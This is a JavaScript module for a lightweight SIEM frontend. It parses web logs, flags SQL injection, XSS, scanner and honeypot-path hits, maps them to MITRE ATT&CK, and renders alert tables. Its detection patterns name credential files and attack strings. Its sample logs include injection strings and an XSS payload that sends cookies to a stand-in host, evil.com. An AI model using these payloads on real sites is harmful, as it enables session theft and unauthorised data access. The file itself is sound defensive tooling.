/**
 * ShadeParse — siem.js
 * Lightweight SIEM frontend module.
 * Handles: log upload/paste, pipeline animation, alert rendering,
 *          severity counters, timeline, and JSON export.
 *
 * Architecture note: follows the same patterns as scanner.js /
 * network.js — no framework, plain ES5-compatible JS, global helpers
 * from utils.js (escHtml, showToast, addAuditLog).
 */

'use strict';

/* ─── SIEM PIPELINE DEFINITION ──────────────────────────────────────────── */

var SIEM_PIPE = [
  { id: 'ingest',      name: 'Log Ingestion',     sub: 'Parse & normalize'    },
  { id: 'parse',       name: 'Field Extractor',   sub: 'IP, TS, method, path' },
  { id: 'detect',      name: 'Detection Engine',  sub: 'SQLi, XSS, scanner'   },
  { id: 'behavioral',  name: 'Behavioral Engine', sub: 'Brute force, floods'  },
  { id: 'correlate',   name: 'Correlation',       sub: 'Cross-IP analysis'    },
  { id: 'score',       name: 'Risk Scoring',      sub: 'Dedup & rank'         },
];

/* ─── STATE ──────────────────────────────────────────────────────────────── */

var SIEM = {
  running:     false,
  lastResult:  null,
  backendUrl:  'http://127.0.0.1:5050',
  useBackend:  true,    /* set false to use client-side engine only */
};

/* ─── SEVERITY CONFIG ────────────────────────────────────────────────────── */

var SEV_CONFIG = {
  CRITICAL: { color: 'var(--red)',    icon: '⛔', order: 4 },
  HIGH:     { color: 'var(--coral)',  icon: '🔴', order: 3 },
  MEDIUM:   { color: 'var(--amber)',  icon: '🟡', order: 2 },
  LOW:      { color: 'var(--green)',  icon: '🟢', order: 1 },
  INFO:     { color: 'var(--teal)',   icon: 'ℹ️', order: 0 },
};

/* ─── MITRE ATT&CK MAPPING (§2.1) ────────────────────────────────────────── */
var MITRE_MAP = {
  'SQL Injection':              { id:'T1190',     name:'Exploit Public-Facing Application',   tactic:'Initial Access' },
  'Cross-Site Scripting (XSS)': { id:'T1059.007', name:'Command/Scripting Interpreter: JS',   tactic:'Execution' },
  'Directory Brute Force':      { id:'T1595.003', name:'Active Scanning: Wordlist Scanning',  tactic:'Reconnaissance' },
  'Security Scanner':           { id:'T1595.002', name:'Active Scanning: Vulnerability Scan', tactic:'Reconnaissance' },
  'High-Frequency Requests':    { id:'T1499.002', name:'Endpoint DoS: Service Exhaustion',    tactic:'Impact' },
  'Brute Force Login':          { id:'T1110',     name:'Brute Force',                         tactic:'Credential Access' },
  'Credential Stuffing':        { id:'T1110.004', name:'Brute Force: Credential Stuffing',    tactic:'Credential Access' },
  'Beacon Candidate':           { id:'T1071.001', name:'Application Layer Protocol: Web',     tactic:'Command & Control' },
  'Tor Exit Source':            { id:'T1090.003', name:'Multi-hop Proxy: Tor',                tactic:'Command & Control' },
  'DGA Domain':                 { id:'T1568.002', name:'Dynamic Resolution: DGA',             tactic:'Command & Control' },
  'Escalated: Multi-Hit Source':{ id:'T1078',     name:'Valid Accounts (composite)',          tactic:'Initial Access' },
};
function siemMitreFor(alertType) {
  if (!alertType) return null;
  if (MITRE_MAP[alertType]) return MITRE_MAP[alertType];
  // Honeypot path entries are typed "Honeypot Path: <label>"
  if (alertType.indexOf('Honeypot Path') === 0) {
    return { id:'T1083', name:'File and Directory Discovery', tactic:'Discovery' };
  }
  return null;
}

/* ─── HONEYPOT PATHS (§2.3) ──────────────────────────────────────────────── */
var HONEYPOT_PATHS = [
  { re: /^\/\.env(?:\.|$)/i,                                 sev:'CRITICAL', label:'.env access' },
  { re: /^\/\.git\/(?:HEAD|config|index|logs)/i,             sev:'CRITICAL', label:'.git directory' },
  { re: /^\/\.aws\/credentials/i,                            sev:'CRITICAL', label:'AWS credentials' },
  { re: /^\/\.ssh\/(?:id_rsa|id_dsa|authorized_keys)/i,      sev:'CRITICAL', label:'SSH keys' },
  { re: /^\/_ignition\/execute-solution/i,                   sev:'CRITICAL', label:'Laravel Ignition RCE' },
  { re: /^\/wp-config\.php/i,                                sev:'CRITICAL', label:'wp-config.php' },
  { re: /^\/wp-(?:admin|login)\.php/i,                       sev:'HIGH',     label:'WordPress admin' },
  { re: /^\/phpmyadmin/i,                                    sev:'HIGH',     label:'phpMyAdmin' },
  { re: /^\/server-status/i,                                 sev:'HIGH',     label:'Apache server-status' },
  { re: /^\/phpinfo\.php/i,                                  sev:'HIGH',     label:'phpinfo' },
  { re: /^\/admin(?:\/|$)/i,                                 sev:'MEDIUM',   label:'/admin' },
  { re: /^\/(?:console|jenkins|grafana|prometheus)(?:\/|$)/i,sev:'MEDIUM',   label:'admin console' },
  { re: /^\/api\/v1\/swagger/i,                              sev:'LOW',      label:'Swagger UI' },
  { re: /^\/\.DS_Store/i,                                    sev:'LOW',      label:'.DS_Store' },
];
var HONEYPOT_SEV_SCORE = { CRITICAL:90, HIGH:75, MEDIUM:55, LOW:30 };

/* ─── §0.7 SHARED HELPERS ────────────────────────────────────────────────── */
function siemAlertSignature(alert) {
  return [alert.type, alert.severity, alert.ip||'-',
          alert.endpoint||'-', alert.timestamp||'-'].join('|');
}

function siemAppendKqlToken(field, value) {
  var input = document.getElementById('siemSearchInput');
  if (!input) return;
  var v = String(value);
  var token;
  if (field === 'any') token = /\s/.test(v) ? '"'+v+'"' : v;
  else                 token = field + ':' + (/\s/.test(v) ? '"'+v+'"' : v);
  // Skip if same token already present
  var existing = input.value.split(/\s+/).filter(Boolean);
  if (existing.indexOf(token) === -1) {
    input.value = (input.value.trim() + ' ' + token).trim();
  }
  if (typeof siemApplySearch === 'function') siemApplySearch();
}

function siemTopN(alerts, fieldGetter, n) {
  var counts = {};
  alerts.forEach(function(a){
    var v = fieldGetter(a);
    if (v == null || v === '') return;
    counts[v] = (counts[v]||0) + 1;
  });
  return Object.keys(counts)
    .map(function(k){ return [k, counts[k]]; })
    .sort(function(a,b){ return b[1]-a[1]; })
    .slice(0, n||10);
}

function siemPickBucketMs(rangeMs) {
  var target = Math.max(1, rangeMs / 50);
  var candidates = [
    1e3, 5e3, 10e3, 30e3,
    60e3, 5*60e3, 10*60e3, 30*60e3,
    3.6e6, 6*3.6e6, 24*3.6e6,
    7*24*3.6e6
  ];
  for (var i=0;i<candidates.length;i++)
    if (candidates[i] >= target) return candidates[i];
  return candidates[candidates.length-1];
}

function siemFmtBucket(ms, bucketMs) {
  var d = new Date(ms);
  if (bucketMs >= 24*3.6e6)  return d.toISOString().slice(0,10);
  if (bucketMs >= 3.6e6)     return d.toISOString().slice(11,13)+':00';
  return d.toISOString().slice(11,16);
}

/* ─── §1.4 TIME-RANGE STATE ──────────────────────────────────────────────── */
var SIEM_TIMERANGE = {
  active:  false,
  startMs: null,
  endMs:   null,
  preset:  'all',
};

/* ─── PIPELINE RENDERER ──────────────────────────────────────────────────── */

function siemRenderPipe(activeId, doneIds) {
  doneIds = doneIds || [];
  var el = document.getElementById('siemPipeList');
  if (!el) return;

  var html = '';
  SIEM_PIPE.forEach(function(step) {
    var isDone  = doneIds.indexOf(step.id) > -1;
    var isAct   = step.id === activeId;
    var cls     = isDone ? 'done' : isAct ? 'active' : '';
    var dot     = isDone ? '&#10003;' : step.id.slice(0, 2).toUpperCase();

    html += '<div class="pipe-step ' + cls + '">';
    html += '<div class="pdot">' + dot + '</div>';
    html += '<div class="pinfo">';
    html += '<div class="pname">' + escHtml(step.name) + '</div>';
    html += '<div class="psub">'  + escHtml(step.sub)  + '</div>';
    html += '</div></div>';
  });

  el.innerHTML = html;
}

function siemSetProgress(pct, label) {
  var fill = document.getElementById('siemProgFill');
  var lbl  = document.getElementById('siemProgLabel');
  if (fill) fill.style.width = pct + '%';
  if (lbl)  lbl.textContent  = label || '';
}

/* ─── PIPELINE ANIMATION (simulated stages while waiting for backend) ────── */

function siemAnimatePipeline(onComplete) {
  var ids   = SIEM_PIPE.map(function(s) { return s.id; });
  var done  = [];
  var idx   = 0;
  var total = ids.length;

  function step() {
    if (idx >= total) {
      siemRenderPipe(null, ids);
      siemSetProgress(100, 'Complete');
      if (typeof onComplete === 'function') onComplete();
      return;
    }
    var cur = ids[idx];
    siemRenderPipe(cur, done.slice());
    siemSetProgress(Math.round((idx / total) * 100), SIEM_PIPE[idx].name + '...');
    done.push(cur);
    idx++;
    setTimeout(step, 320);
  }

  siemRenderPipe(ids[0], []);
  siemSetProgress(0, 'Starting...');
  setTimeout(step, 100);
}

/* ─── LOG SUBMISSION ─────────────────────────────────────────────────────── */

function siemRunAnalysis() {
  if (SIEM.running) return;

  var pasteEl = document.getElementById('siemLogPaste');
  var fileEl  = document.getElementById('siemFileInput');
  var fmtEl   = document.getElementById('siemLogFormat');

  var pasteVal = pasteEl ? pasteEl.value.trim() : '';
  var file     = fileEl  && fileEl.files && fileEl.files[0] ? fileEl.files[0] : null;
  var fmt      = fmtEl   ? fmtEl.value : 'auto';

  if (!pasteVal && !file) {
    showToast('Please paste logs or upload a file first.', 'warn');
    return;
  }

  SIEM.running = true;
  siemSetRunButton(true);
  siemClearResults();
  siemAddLog('Starting SIEM pipeline...', 'info');

  // Animate pipeline visually while request is in-flight
  siemAnimatePipeline(function() {
    siemAddLog('Pipeline complete — rendering results.', 'ok');
  });

  if (SIEM.useBackend && file) {
    siemSubmitFile(file, fmt);
  } else if (SIEM.useBackend) {
    siemSubmitPaste(pasteVal, fmt);
  } else {
    // Client-side fallback (basic, no behavioral analysis)
    siemClientSideAnalyze(pasteVal);
  }
}

function siemSubmitPaste(logs, fmt) {
  siemAddLog('Sending logs to SIEM backend...', 'info');

  fetch(SIEM.backendUrl + '/siem/analyze', {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ logs: logs, format: fmt }),
  })
  .then(function(r) { return r.json(); })
  .then(function(data) { siemHandleResult(data); })
  .catch(function(err) {
    siemAddLog('Backend unreachable — using client-side engine.', 'warn');
    // Fallback to client-side engine
    siemClientSideAnalyze(logs);
  });
}

function siemSubmitFile(file, fmt) {
  siemAddLog('Uploading log file: ' + escHtml(file.name), 'info');

  var fd = new FormData();
  fd.append('file', file);
  fd.append('format', fmt);

  fetch(SIEM.backendUrl + '/siem/analyze', {
    method: 'POST',
    body:   fd,
  })
  .then(function(r) { return r.json(); })
  .then(function(data) { siemHandleResult(data); })
  .catch(function(err) {
    // Read file client-side and fall back
    var reader = new FileReader();
    reader.onload = function(e) {
      siemAddLog('Falling back to client-side engine.', 'warn');
      siemClientSideAnalyze(e.target.result);
    };
    reader.readAsText(file);
  });
}

/* ─── RESULT HANDLER ─────────────────────────────────────────────────────── */

function siemHandleResult(data) {
  SIEM.running    = false;
  SIEM.lastResult = data;
  siemSetRunButton(false);

  if (!data || !data.success) {
    var msg = (data && data.error) ? data.error : 'Unknown error';
    showToast('SIEM Error: ' + msg, 'error');
    siemAddLog('Error: ' + msg, 'err');
    return;
  }

  siemAddLog(
    'Analysis complete — ' + data.total_alerts + ' alerts in ' +
    data.elapsed_ms + 'ms across ' + data.log_count + ' log entries.',
    'ok'
  );

  // Tag every alert with its MITRE technique (§2.1)
  (data.alerts || []).forEach(function(a) {
    if (!a.mitre) {
      var m = siemMitreFor(a.type);
      if (m) a.mitre = m;
    }
  });

  siemRenderSeverityCounters(data.severity || {});
  siemRenderAlertsTable(data.alerts || []);
  siemRenderTimelineHisto(data.alerts || []);   // §1.1
  siemRenderTopN(data.alerts || []);            // §1.2
  siemRenderTimeline(data.timeline || []);
  siemRenderStageCounts(data.stage_counts || {});

  // Show results panel
  var panel = document.getElementById('siemResultsPanel');
  if (panel) panel.style.display = 'block';

  // Update dashboard badge if the function exists
  if (typeof updateDashboard === 'function' && APP && APP.state) {
    updateDashboard(APP.state);
  }
  showToast(
    data.total_alerts + ' SIEM alert' + (data.total_alerts === 1 ? '' : 's') + ' detected.',
    data.total_alerts > 0 ? 'warn' : 'ok'
  );
}

/* ─── CLIENT-SIDE DETECTION ENGINE (fallback) ───────────────────────────── */

var _CLIENT_SQLI = [
  /'\s*OR\s+['"\d]/i, /UNION\s+SELECT/i, /DROP\s+TABLE/i,
  /1\s*=\s*1/i, /SLEEP\s*\(\d+\)/i, /INFORMATION_SCHEMA/i,
];
var _CLIENT_XSS  = [
  /<script[\s>]/i, /javascript\s*:/i, /on(?:load|click|error|focus)\s*=/i,
  /eval\s*\(/i, /document\s*\.\s*(?:write|cookie)/i,
];
var _CLIENT_BRUTE = /\/(?:admin|wp-admin|phpmyadmin|\.env|config|backup|\.git)/i;
var _CLIENT_SCAN  = /(?:sqlmap|nikto|nmap|nuclei|gobuster|dirbuster|wfuzz|burpsuite)/i;

function siemClientSideAnalyze(raw) {
  var lines   = raw.split('\n').filter(function(l) { return l.trim(); });
  var alerts  = [];
  var ipStats = {};

  lines.forEach(function(line) {
    var ipM  = line.match(/\b(\d{1,3}(?:\.\d{1,3}){3})\b/);
    var ip   = ipM ? ipM[1] : null;
    var tsM  = line.match(/\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}/);
    var ts   = tsM ? tsM[0] : null;
    var mthM = line.match(/"(GET|POST|PUT|DELETE|PATCH)\s+([^\s"]+)/);
    var mth  = mthM ? mthM[1] : null;
    var ep   = mthM ? mthM[2] : null;
    // Status code & UA extraction (§1.2 widgets, §0.2 Alert shape)
    var stM  = line.match(/"\s+(\d{3})\s+/);
    var st   = stM ? stM[1] : null;
    var uaM  = line.match(/"([^"]+)"\s*$/);
    var ua   = uaM ? uaM[1] : null;

    if (ip) {
      ipStats[ip] = (ipStats[ip] || 0) + 1;
    }

    function mk(type, sev, score, evidence, extra) {
      var a = { type:type, severity:sev, ip:ip, timestamp:ts, endpoint:ep,
                evidence: evidence || line.slice(0, 200), risk_score:score,
                method:mth, status:st, ua:ua };
      if (extra) Object.assign(a, extra);
      return a;
    }

    // SQLi
    if (_CLIENT_SQLI.some(function(r) { return r.test(line); }))
      alerts.push(mk('SQL Injection', 'HIGH', 75));

    // XSS
    if (_CLIENT_XSS.some(function(r) { return r.test(line); }))
      alerts.push(mk('Cross-Site Scripting (XSS)', 'HIGH', 70));

    // Dir brute
    if (ep && _CLIENT_BRUTE.test(ep))
      alerts.push(mk('Directory Brute Force', 'MEDIUM', 50, ep));

    // Scanner UA
    if (_CLIENT_SCAN.test(line))
      alerts.push(mk('Security Scanner', 'MEDIUM', 55));

    // Honeypot path hits (§2.3) — explicit list of "must never be touched" paths
    if (ep) {
      HONEYPOT_PATHS.forEach(function(h) {
        if (h.re.test(ep)) {
          alerts.push(mk('Honeypot Path: '+h.label, h.sev,
                         HONEYPOT_SEV_SCORE[h.sev] || 50, undefined,
                         { tags: ['recon','honeypot'], patterns: ['honeypot:'+h.label] }));
        }
      });
    }
  });

  // High-frequency IPs
  Object.keys(ipStats).forEach(function(ip) {
    if (ipStats[ip] >= 50) {
      alerts.push({ type: 'High-Frequency Requests', severity: 'MEDIUM', ip: ip, timestamp: null, endpoint: null, evidence: ipStats[ip] + ' requests', risk_score: 48 });
    }
  });

  // Build synthetic result object
  var sev = {};
  alerts.forEach(function(a) { sev[a.severity] = (sev[a.severity] || 0) + 1; });

  var timeline = Object.keys(ipStats).map(function(ip) {
    return { ip: ip, events: ipStats[ip], types: [] };
  }).sort(function(a, b) { return b.events - a.events; });

  siemHandleResult({
    success:      true,
    elapsed_ms:   0,
    log_count:    lines.length,
    total_alerts: alerts.length,
    alerts:       alerts,
    severity:     sev,
    timeline:     timeline,
    stage_counts: { ingested: lines.length, parsed: lines.length, final_alerts: alerts.length },
    timestamp:    new Date().toISOString(),
  });
}

/* ─── RENDERING: SEVERITY COUNTERS ──────────────────────────────────────── */

function siemRenderSeverityCounters(sev) {
  var el = document.getElementById('siemSevCounters');
  if (!el) return;

  var keys = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'];
  var html = '';

  keys.forEach(function(k) {
    var cfg   = SEV_CONFIG[k] || {};
    var count = sev[k] || 0;
    html += '<div class="siem-sev-card" style="border-color:' + cfg.color + '33">';
    html += '<div class="siem-sev-icon" style="color:' + cfg.color + '">' + cfg.icon + '</div>';
    html += '<div class="siem-sev-count" style="color:' + cfg.color + '">' + count + '</div>';
    html += '<div class="siem-sev-label">' + escHtml(k) + '</div>';
    html += '</div>';
  });

  el.innerHTML = html;
}

/* ─── RENDERING: ALERTS TABLE ───────────────────────────────────────────── */

function siemRenderAlertsTable(alerts) {
  var tbody = document.getElementById('siemAlertsBody');
  var empty = document.getElementById('siemAlertsEmpty');
  if (!tbody) return;

  if (!alerts || alerts.length === 0) {
    tbody.innerHTML = '';
    if (empty) empty.style.display = 'block';
    return;
  }

  if (empty) empty.style.display = 'none';

  var html = '';
  alerts.forEach(function(alert, idx) {
    var cfg    = SEV_CONFIG[alert.severity] || SEV_CONFIG.INFO;
    var sevBdg = '<span class="siem-sev-badge" style="background:' + cfg.color + '22;color:' + cfg.color + ';border-color:' + cfg.color + '44">' + escHtml(alert.severity) + '</span>';
    var ip     = alert.ip
      ? '<span class="siem-filterable" data-field="ip" data-val="'+escHtml(alert.ip)+'" '+
        'title="Click to filter by ip:'+escHtml(alert.ip)+'">'+escHtml(alert.ip)+'</span>'
      : '<span class="siem-na">N/A</span>';
    var ts     = alert.timestamp ? escHtml(alert.timestamp.slice(0,19)) : '<span class="siem-na">—</span>';
    var ep     = alert.endpoint
      ? '<code class="siem-path siem-filterable" data-field="endpoint" data-val="'+escHtml(alert.endpoint)+'" '+
        'title="Click to filter by endpoint">'+escHtml(alert.endpoint.slice(0,60))+'</code>'
      : '<span class="siem-na">—</span>';
    var occ    = alert.occurrences > 1 ? '<span class="siem-occ">×' + alert.occurrences + '</span>' : '';
    var score  = alert.risk_score || 0;
    var fill   = Math.min(100, score);
    var fillColor = score >= 75 ? 'var(--red)' : score >= 50 ? 'var(--amber)' : 'var(--green)';

    html += '<tr class="siem-row" onclick="siemToggleDetail(' + idx + ')">';
    html += '<td>' + sevBdg + '</td>';
    var mitrePill = alert.mitre
      ? '<a class="siem-mitre" href="https://attack.mitre.org/techniques/' +
        escHtml(alert.mitre.id.replace(/\./g,'/')) + '/" target="_blank" rel="noopener" ' +
        'onclick="event.stopPropagation()" ' +
        'title="' + escHtml(alert.mitre.name + ' - ' + alert.mitre.tactic) + '">' +
        escHtml(alert.mitre.id) + '</a>'
      : '';
    html += '<td><strong>' + escHtml(alert.type) + '</strong>' + occ + mitrePill + '</td>';
    html += '<td>' + ip + '</td>';
    html += '<td>' + ts + '</td>';
    html += '<td>' + ep + '</td>';
    html += '<td>';
    html += '<div class="siem-score-wrap">';
    html += '<div class="siem-score-bar"><div class="siem-score-fill" style="width:' + fill + '%;background:' + fillColor + '"></div></div>';
    html += '<span class="siem-score-val">' + score + '</span>';
    html += '</div>';
    html += '</td>';
    html += '</tr>';

    // Expandable detail row
    html += '<tr class="siem-detail-row" id="siemDetail' + idx + '" style="display:none">';
    html += '<td colspan="6">';
    html += '<div class="siem-detail-wrap">';
    if (alert.evidence) {
      html += '<div class="siem-detail-label">EVIDENCE</div>';
      html += '<pre class="siem-evidence">' + escHtml(alert.evidence) + '</pre>';
    }
    if (alert.patterns && alert.patterns.length) {
      html += '<div class="siem-detail-label">MATCHED PATTERNS</div>';
      html += '<div class="siem-patterns">' +
        alert.patterns.map(function(p) {
          return '<code class="siem-pattern-tag">' + escHtml(p) + '</code>';
        }).join(' ') + '</div>';
    }
    if (alert.correlation_note) {
      html += '<div class="siem-corr-note">⚠ ' + escHtml(alert.correlation_note) + '</div>';
    }
    html += '</div>';
    html += '</td></tr>';
  });

  tbody.innerHTML = html;

  // Store alerts reference for expand/collapse
  siemRenderAlertsTable._cache = alerts;
}

function siemToggleDetail(idx) {
  var row = document.getElementById('siemDetail' + idx);
  if (!row) return;
  var visible = row.style.display !== 'none';
  row.style.display = visible ? 'none' : 'table-row';
}

/* ─── RENDERING: TIMELINE ────────────────────────────────────────────────── */

function siemRenderTimeline(timeline) {
  var el = document.getElementById('siemTimeline');
  if (!el) return;

  if (!timeline || timeline.length === 0) {
    el.innerHTML = '<div class="siem-empty-msg">No IP activity to display.</div>';
    return;
  }

  var maxEvents = timeline.reduce(function(m, t) { return Math.max(m, t.events); }, 1);

  var html = '<table class="siem-timeline-table">';
  html += '<thead><tr><th>IP Address</th><th>Events</th><th>Attack Types</th><th>Activity</th></tr></thead>';
  html += '<tbody>';

  timeline.slice(0, 15).forEach(function(item) {
    var pct  = Math.round((item.events / maxEvents) * 100);
    var types = (item.types || []).slice(0, 3).join(', ') || '—';
    var barColor = pct > 70 ? 'var(--red)' : pct > 40 ? 'var(--amber)' : 'var(--teal)';

    html += '<tr>';
    html += '<td><code class="siem-ip">' + escHtml(item.ip) + '</code></td>';
    html += '<td><strong>' + item.events + '</strong></td>';
    html += '<td class="siem-types">' + escHtml(types) + '</td>';
    html += '<td>';
    html += '<div class="siem-activity-bar">';
    html += '<div class="siem-activity-fill" style="width:' + pct + '%;background:' + barColor + '"></div>';
    html += '</div>';
    html += '</td>';
    html += '</tr>';
  });

  html += '</tbody></table>';
  el.innerHTML = html;
}

/* ─── RENDERING: STAGE COUNTS ────────────────────────────────────────────── */

function siemRenderStageCounts(counts) {
  var el = document.getElementById('siemStageCounts');
  if (!el) return;

  var stages = [
    { key: 'ingested',          label: 'Lines Ingested'   },
    { key: 'parsed',            label: 'Lines Parsed'     },
    { key: 'rule_alerts',       label: 'Rule Hits'        },
    { key: 'behavioral_alerts', label: 'Behavioral Hits'  },
    { key: 'correlated',        label: 'After Correlation'},
    { key: 'final_alerts',      label: 'Final Alerts'     },
  ];

  var html = '';
  stages.forEach(function(s) {
    var v = counts[s.key];
    if (v === undefined) return;
    html += '<div class="siem-stage-stat">';
    html += '<div class="siem-stage-val">' + v + '</div>';
    html += '<div class="siem-stage-label">' + escHtml(s.label) + '</div>';
    html += '</div>';
  });

  el.innerHTML = html;
}

/* ─── AUDIT LOG ──────────────────────────────────────────────────────────── */

function siemAddLog(msg, type) {
  var el = document.getElementById('siemAuditLog');
  if (!el) return;

  var colorMap = { ok: 'var(--green)', warn: 'var(--amber)', err: 'var(--red)', info: 'var(--text2)' };
  var color    = colorMap[type] || colorMap.info;

  var now = new Date();
  var ts  = now.toTimeString().slice(0, 8);

  var div = document.createElement('div');
  div.className = 'siem-log-line';
  div.innerHTML = '<span class="siem-log-ts">' + escHtml(ts) + '</span>' +
                  '<span class="siem-log-msg" style="color:' + color + '">' + escHtml(msg) + '</span>';

  el.appendChild(div);
  el.scrollTop = el.scrollHeight;

  // Mirror to global audit log if available
  if (typeof addAuditLog === 'function') {
    addAuditLog('[SIEM] ' + msg);
  }
}

/* ─── UI HELPERS ─────────────────────────────────────────────────────────── */

function siemSetRunButton(running) {
  var btn = document.getElementById('siemRunBtn');
  if (!btn) return;
  btn.disabled    = running;
  btn.textContent = running ? 'Analyzing...' : 'Run Analysis';
  btn.style.opacity = running ? '0.6' : '1';
}

function siemClearResults() {
  var els = ['siemSevCounters', 'siemAlertsBody', 'siemTimeline', 'siemStageCounts'];
  els.forEach(function(id) {
    var el = document.getElementById(id);
    if (el) el.innerHTML = '';
  });
  var panel = document.getElementById('siemResultsPanel');
  if (panel) panel.style.display = 'none';

  siemRenderPipe(null, []);
  siemSetProgress(0, 'Idle');
}

function siemExportJSON() {
  if (!SIEM.lastResult) {
    showToast('No analysis results to export.', 'warn');
    return;
  }
  var json = JSON.stringify(SIEM.lastResult, null, 2);
  var blob = new Blob([json], { type: 'application/json' });
  var url  = URL.createObjectURL(blob);
  var a    = document.createElement('a');
  a.href   = url;
  a.download = 'siem-alerts-' + new Date().toISOString().slice(0, 10) + '.json';
  a.click();
  URL.revokeObjectURL(url);
  siemAddLog('Exported ' + SIEM.lastResult.total_alerts + ' alerts as JSON.', 'ok');
}

/* Handle file drop on SIEM drop zone */
function siemInitDropZone() {
  var zone = document.getElementById('siemDropZone');
  if (!zone) return;

  zone.addEventListener('dragover', function(e) {
    e.preventDefault();
    zone.classList.add('drag-over');
  });
  zone.addEventListener('dragleave', function() {
    zone.classList.remove('drag-over');
  });
  zone.addEventListener('drop', function(e) {
    e.preventDefault();
    zone.classList.remove('drag-over');
    var files = e.dataTransfer.files;
    if (files && files[0]) {
      var fi = document.getElementById('siemFileInput');
      if (fi) {
        // Assign dropped file to the hidden file input
        var dt = new DataTransfer();
        dt.items.add(files[0]);
        fi.files = dt.files;
        siemShowFileName(files[0].name);
      }
    }
  });
}

function siemShowFileName(name) {
  var el = document.getElementById('siemFileName');
  if (el) {
    el.textContent = name;
    el.style.display = 'inline';
  }
}

function siemLoadSample() {
  var el = document.getElementById('siemLogPaste');
  if (!el) return;
  el.value = SIEM_SAMPLE_LOGS;
  siemAddLog('Sample logs loaded — click Run Analysis.', 'info');
}

/* ─── SAMPLE LOGS ────────────────────────────────────────────────────────── */

var SIEM_SAMPLE_LOGS = [
  '2024-03-15T08:22:01Z 192.168.1.10 "GET /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T08:22:05Z 192.168.1.10 "GET /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T08:22:09Z 192.168.1.10 "GET /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T08:22:12Z 192.168.1.10 "GET /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T08:22:15Z 192.168.1.10 "POST /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T08:22:18Z 192.168.1.10 "POST /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T08:25:00Z 10.0.0.55 "GET /search?q=\' OR 1=1-- HTTP/1.1" 200 - "sqlmap/1.7"',
  '2024-03-15T08:25:01Z 10.0.0.55 "GET /users?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 500 - "sqlmap/1.7"',
  '2024-03-15T08:26:00Z 10.0.0.55 "POST /comment HTTP/1.1" 200 - "sqlmap/1.7" payload=<script>document.location=\'http://evil.com/steal?c=\'+document.cookie</script>',
  '2024-03-15T08:30:00Z 172.16.0.8 "GET /wp-admin HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:01Z 172.16.0.8 "GET /.env HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:02Z 172.16.0.8 "GET /backup.zip HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:03Z 172.16.0.8 "GET /.git/config HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:04Z 172.16.0.8 "GET /phpmyadmin HTTP/1.1" 403 - "nikto/2.1.6"',
  '2024-03-15T08:30:05Z 172.16.0.8 "GET /config.php HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:06Z 172.16.0.8 "GET /etc/passwd HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:07Z 172.16.0.8 "GET /id_rsa HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:08Z 172.16.0.8 "GET /.htaccess HTTP/1.1" 403 - "nikto/2.1.6"',
  '2024-03-15T08:31:00Z 203.0.113.42 "GET / HTTP/1.1" 200 - "curl/7.88"',
  '2024-03-15T08:35:00Z 192.168.1.10 "GET /dashboard HTTP/1.1" 200 - "Mozilla/5.0"',
].join('\n');

/* ─── ELK-STYLE SEARCH RULES ─────────────────────────────────────────────── */

/**
 * Search state: parsed tokens derived from the query string.
 * Each token: { field, op, val, raw }
 *   field: 'severity' | 'ip' | 'type' | 'score' | 'endpoint' | 'any'
 *   op:    ':' | ':>' | ':<' | ':>=' | ':<=' | ':!'
 *   val:   string or number
 */
var SIEM_SEARCH = {
  tokens: [],        // active parsed tokens
  quickFilters: [],  // { field, val } added via quick-filter buttons
};

/** Parse a KQL-like query string into token objects */
function siemParseQuery(raw) {
  var tokens = [];
  if (!raw || !raw.trim()) return tokens;

  // Regex: field:op?value  OR  bare freetext
  // Supported field aliases — extended for Milestones A + B (line parsing
  // and threat-intel enrichment fields).
  var FIELD_MAP = {
    severity: 'severity', sev: 'severity',
    ip:       'ip',       src: 'ip',
    type:     'type',     attack: 'type',
    score:    'score',    risk: 'score',
    endpoint: 'endpoint', path: 'endpoint', ep: 'endpoint',
    /* Line-parsed fields */
    method:   'method',   verb: 'method',
    status:   'status',   code: 'status', http: 'status',
    ua:       'ua',       useragent: 'ua', user_agent: 'ua', agent: 'ua',
    /* Geo / ASN enrichment */
    country:  'country',
    cc:       'cc',       countrycode: 'cc', country_code: 'cc',
    city:     'city',
    asn:      'asn',
    org:      'org',
    provider: 'provider', asnprov: 'provider',
    kind:     'kind',     asnkind: 'kind',
    /* Threat intel */
    mitre:    'mitre',    technique: 'mitre',
    tag:      'tag',
  };
  var NUMERIC_FIELDS = { score:1, status:1 };

  // Split on whitespace but keep quoted strings together
  var parts = raw.match(/(?:[^\s"]+|"[^"]*")+/g) || [];

  parts.forEach(function(part) {
    // Try field:op?value
    var m = part.match(/^(\w+)(:[<>!]=?|:)(.+)$/);
    if (m) {
      var fieldRaw = m[1].toLowerCase();
      var opRaw    = m[2];
      var valRaw   = m[3].replace(/^"|"$/g, ''); // strip quotes

      var field = FIELD_MAP[fieldRaw];
      if (field) {
        var op = opRaw;
        var val = NUMERIC_FIELDS[field] ? parseFloat(valRaw) : valRaw.toLowerCase();
        tokens.push({ field: field, op: op, val: val, raw: part });
        return;
      }
    }
    // Bare text → match any field
    var bare = part.replace(/^"|"$/g, '').toLowerCase();
    if (bare) {
      tokens.push({ field: 'any', op: ':', val: bare, raw: part });
    }
  });

  return tokens;
}

/** Test a single alert against a single token */
function siemTokenMatch(alert, token) {
  var val = token.val;
  var op  = token.op;

  function contains(str) {
    return str && str.toLowerCase().indexOf(val) !== -1;
  }
  function numOp(n) {
    n = parseFloat(n) || 0;
    if (op === ':>') return n > val;
    if (op === ':<') return n < val;
    if (op === ':>=') return n >= val;
    if (op === ':<=') return n <= val;
    if (op === ':!')  return n !== val;
